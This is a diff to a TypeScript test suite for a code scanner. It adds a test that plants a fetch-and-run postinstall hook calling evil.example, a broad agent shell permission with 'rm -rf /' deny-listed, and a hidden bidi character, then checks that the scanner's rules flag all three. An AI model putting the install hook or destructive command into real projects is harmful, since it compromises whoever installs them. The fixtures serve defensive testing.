@@ -108,18 +108,72 @@ describe("pipeline", () => {
     await scan(root, { kind: "full" });
     const db = await getDb(root);
 
-    const importers = runQuery(db, "importers", "src/core/db.ts") as Array<{ importer: string }>;
+    const ctx = { db, pluginRoot: root };
+    const importers = (await runQuery(ctx, "importers", "src/core/db.ts")) as Array<{
+      importer: string;
+    }>;
     expect(importers.map((row) => row.importer).sort()).toEqual([
       "src/api/orders.ts",
       "src/api/users.ts",
       "src/core/db.test.ts",
     ]);
 
-    const symbols = runQuery(db, "symbol", "getUser") as Array<{ path: string }>;
+    const symbols = (await runQuery(ctx, "symbol", "getUser")) as Array<{ path: string }>;
     expect(symbols[0].path).toBe("src/api/users.ts");
 
-    const hotspots = runQuery(db, "hotspots", undefined, 3) as Array<{ path: string; fan_in: number }>;
+    const hotspots = (await runQuery(ctx, "hotspots", undefined, 3)) as Array<{
+      path: string;
+      fan_in: number;
+    }>;
     expect(hotspots[0].path).toBe("src/core/db.ts");
+  });
+
+  it("wires supply-chain and unicode analysis into the run", async () => {
+    root = await makeProject({
+      ...PROJECT,
+      "package.json": JSON.stringify({
+        name: "fixture",
+        scripts: { postinstall: "curl -s https://evil.example/i.sh | sh" },
+      }),
+      ".claude/settings.json": JSON.stringify({
+        permissions: { allow: ["Bash(*)"], deny: ["Bash(rm -rf /)"] },
+      }),
+      "src/smuggled.ts": `const admin = false; // ${String.fromCodePoint(0x202e)}flip\n`,
+    });
+
+    await scan(root, { kind: "full" });
+    const analysis = await runAnalyzers(root, { offline: true });
+
+    const byTool = Object.fromEntries(analysis.tools.map((tool) => [tool.tool, tool]));
+    expect(byTool["supply-chain"].status).toBe("ok");
+    expect(byTool["unicode"].status).toBe("ok");
+
+    const db = await getDb(root);
+    const rules = db
+      .all<{ rule_id: string }>(
+        "SELECT DISTINCT rule_id FROM findings WHERE status = 'open' ORDER BY rule_id",
+      )
+      .map((row) => row.rule_id);
+
+    expect(rules).toContain("supply-chain/install-script-execution");
+    expect(rules).toContain("supply-chain/agent-broad-permission");
+    expect(rules).toContain("unicode/bidi-control");
+
+    // The deny-listed command must not be reported as a use of it.
+    expect(rules).not.toContain("supply-chain/agent-config-execution");
+
+    // Both new sources take part in the fix lifecycle like any other tool.
+    const { writeFile } = await import("node:fs/promises");
+    await writeFile(join(root, "src/smuggled.ts"), "const admin = false;\n");
+    await scan(root, { kind: "incremental" });
+    const second = await runAnalyzers(root, { offline: true });
+
+    expect(second.closed).toBeGreaterThan(0);
+    expect(
+      db.count(
+        "SELECT COUNT(*) AS n FROM findings WHERE rule_id = 'unicode/bidi-control' AND status = 'fixed'",
+      ),
+    ).toBe(1);
   });
 
   it("carries findings across runs and reports fixes", async () => {
